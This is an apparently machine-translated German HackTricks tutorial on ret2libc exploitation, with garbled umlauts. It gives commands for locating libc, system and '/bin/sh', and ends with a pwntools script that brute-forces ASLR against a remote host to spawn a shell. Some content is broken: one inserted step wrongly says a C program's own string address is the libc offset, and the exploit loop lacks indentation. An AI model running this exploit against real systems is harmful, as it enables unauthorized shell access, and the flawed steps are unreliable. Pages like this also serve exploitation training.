<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>


**Wenn Sie eine verwundbare Bin√§rdatei gefunden haben und glauben, dass Sie sie mit Ret2Lib ausnutzen k√∂nnen, finden Sie hier einige grundlegende Schritte, denen Sie folgen k√∂nnen.**

# Wenn Sie **innerhalb** des **Hosts** sind

## Sie k√∂nnen die **Adresse von lib**c finden
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Wenn Sie √ºberpr√ºfen m√∂chten, ob ASLR die Adresse von libc √§ndert, k√∂nnen Sie Folgendes tun:
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## Ermitteln Sie den Offset der Systemfunktion

Um eine R√ºcksprungadresse auf die Systemfunktion zu setzen, m√ºssen Sie den Offset dieser Funktion in der Zielbibliothek ermitteln. Dieser Offset wird verwendet, um die Adresse der Systemfunktion im Speicher zu berechnen.

Um den Offset der Systemfunktion zu erhalten, k√∂nnen Sie das Tool `objdump` verwenden. F√ºhren Sie den folgenden Befehl aus, um die Symbole der Zielbibliothek anzuzeigen:

```bash
objdump -T /path/to/target/library.so | grep system
```

Ersetzen Sie `/path/to/target/library.so` durch den Pfad zur Zielbibliothek, in der sich die Systemfunktion befindet. Der Befehl `grep system` filtert die Ausgabe, um nur die Zeile mit dem Symbol der Systemfunktion anzuzeigen.

Die Ausgabe des Befehls enth√§lt den Offset der Systemfunktion. Merken Sie sich diesen Wert, da Sie ihn sp√§ter ben√∂tigen, um die R√ºcksprungadresse zu berechnen.
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
## Ermitteln Sie den Offset von "/bin/sh"

Um den Offset von "/bin/sh" zu ermitteln, k√∂nnen Sie die folgenden Schritte ausf√ºhren:

1. Erstellen Sie ein einfaches C-Programm, das die Adresse von "/bin/sh" druckt.
```c
#include <stdio.h>

int main() {
    printf("/bin/sh Adresse: %p\n", "/bin/sh");
    return 0;
}
```

2. Kompilieren Sie das Programm mit dem Befehl `gcc -o offset offset.c`.

3. F√ºhren Sie das kompilierte Programm aus, um die Adresse von "/bin/sh" zu erhalten. Die Ausgabe sollte √§hnlich aussehen wie: `/bin/sh Adresse: 0x7fffffffe1a0`.

4. Notieren Sie sich die erhaltene Adresse, da dies der Offset von "/bin/sh" ist, den Sie f√ºr die Exploit-Entwicklung verwenden k√∂nnen.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

Wenn der Prozess jedes Mal, wenn Sie mit ihm sprechen (Netzwerkserver), **Kinder** erstellt, versuchen Sie, diese Datei zu **lesen** (wahrscheinlich m√ºssen Sie root sein).

Hier finden Sie **genau, wo die libc im Prozess geladen ist** und **wo sie f√ºr jedes Kind des Prozesses geladen wird**.

![](<../../.gitbook/assets/image (95).png>)

In diesem Fall wird sie bei **0xb75dc000** geladen (Dies wird die Basisadresse von libc sein)

## Verwendung von gdb-peda

Holen Sie sich die Adresse der Funktion **system**, der Funktion **exit** und des Strings **"/bin/sh"** mit gdb-peda:
```
p system
p exit
find "/bin/sh"
```
# Umgehung von ASLR

Sie k√∂nnen versuchen, die Basisadresse von libc durch Brute-Force zu ermitteln.
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# Code
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
